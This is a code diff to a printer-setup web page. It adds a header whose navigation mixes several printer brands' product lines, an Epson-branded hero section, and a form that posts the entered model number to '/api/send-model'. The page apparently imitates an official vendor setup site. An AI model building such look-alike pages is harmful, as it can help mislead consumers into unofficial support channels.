@@ -23,6 +23,9 @@ body{
   font-family: "Poppins", sans-serif;
   font-weight: 100;
   font-style: normal;
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
 }
 .hp-container {
     max-width: 1200px;
@@ -237,26 +240,167 @@ div#stepContent {
   color: #d13438;
   font-weight: 600;
 }
+.header {
+    background: #dff1ff;
+    padding: 18px 30px;
+}
+.header-container {
+  max-width: 1200px;
+  margin: auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+/* Logo */
+.logo img {
+  height: 45px;
+}
+
+/* Navigation */
+.nav {
+  display: flex;
+  gap: 30px;
+}
+
+.nav a {
+  text-decoration: none;
+  font-size: 16px;
+  font-weight: 600;
+  color: #000;
+  letter-spacing: 0.5px;
+}
+
+.nav a:hover {
+  color: #0056ff;
+}
+
+/* Contact Button */
+.btn {
+  text-decoration: none;
+  padding: 10px 22px;
+  border: 2px solid #0056ff;
+  color: #0056ff;
+  border-radius: 12px;
+  font-weight: 700;
+  transition: all 0.3s ease;
+}
+
+.btn:hover {
+  background: #0056ff;
+  color: #fff;
+}
+section.epsonNet-hero {
+    text-align: center;
+}
+section.epsonNet-hero {
+    height: 100vh;
+    width: 100%;
+    background: url("./img/jumbo_top.jpg") no-repeat center center/cover;
+    position: relative;
+    align-items: center;
+}
+.ep-container h1{
+  color: #fff;
+}
+.ep-container p{
+  color: #fff;
+}
+.ep-container {
+    height: 100vh;
+    align-items: center;
+    display: flex;
+    justify-content: center;
+}
+.epsonNet-hero .hp-image {
+    display: none;
+}
+.epsonNet-hero #formBox {
+    background: #fff;
+    padding: 41px 48px;
+    border-radius: 10px;
+}
+ .epsonNet-hero #formBox input{
+  width: 87%;
+ }
+.loading-active.epsonNet-hero .hp-image {
+    display: block;
+}
+ .loading-active.epsonNet-hero {
+    height: 100vh;
+    width: 100%;
+    background: url("./img/jumbo_top.jpg") no-repeat center center/cover;
+    position: relative;
+    align-items: center;
+    background: transparent;
+    height: 100%;
+}
+.loading-active .ep-container {
+    height: 100%;
+    display: flex;
+    justify-content: space-between;
+    padding: 200px 0;
+    width: 70%;
+    margin: 0 auto;
+}
+.epLogo {
+  display: none;
+}
+ .loading-active .epLogo {
+  display: block;
+}
+ .loading-active .ep-container h1 , .loading-active .ep-container p{
+    color: #000000;
+}
+ .loading-active .hp-text {
+    text-align: left;
+}
+.loading-active .hp-text {
+    text-align: left;
+    width: 384px;
+}
   </style>
 </head>
 <body>
-<section class="hp-hero">
-  <div class="hp-container">
+    <header class="header">
+  <div class="header-container">
+
+    <!-- Logo -->
+    <div class="logo">
+      <img src="./img/logo.webp" alt="Printer Logo">
+    </div>
+
+    <!-- Navigation -->
+    <nav class="nav">
+      <a href="#">OFFICEJET</a>
+      <a href="#">LASERJET</a>
+      <a href="#">PIXMA</a>
+      <a href="#">MAXIFY</a>
+      <a href="#">XP SERIES</a>
+    </nav>
+
+    <!-- CTA Button -->
+    <div class="cta">
+      <a href="#" class="btn">CONTACT US</a>
+    </div>
+
+  </div>
+</header>
+<section class="epsonNet-hero">
+  <div class="ep-container">
+   
     <div class="hp-text">
+        <div class="epLogo"><img src="./img/EPSON-1.png"></div>
       <h1>
-        Set up your Epson printer at <br>
-        <span>123.epson.com</span>
+       Setting Up Your Product
       </h1>
       <p class="subtitle">
         Download and install your printer software
       </p>
       <div id="formBox">
- <input id="printerModel" placeholder='Enter exact model number or name. Ex: "Epson Pixma G3010"'>
+ <input id="printerModel" placeholder="Enter Model Number">
   <button id="startBtn">Setup</button>
   </div>
-      <p class="note">
-        Enter your Epson , OfficeJet, LaserJet or DeskJet model number.
-      </p>
     </div>
     <div class="loaderWrap">
       <div id="loadingBox" style="display:none;">
@@ -269,7 +413,7 @@ div#stepContent {
 
     </div>
     <div class="hp-image">
-      <img src="./img/printer-setup.png" alt="Epson Printers">
+      <img src="./img/epsion-loader.webp" alt="Epson Printers">
     </div>
   </div>
 </section>
@@ -284,6 +428,7 @@ document.getElementById("startBtn").addEventListener("click", async function () 
     alert("Please enter printer model");
     return;
   }
+   document.querySelector(".epsonNet-hero").classList.add("loading-active");
   sessionStorage.setItem("printerModel", model);
   try {
     await fetch("/api/send-model", {
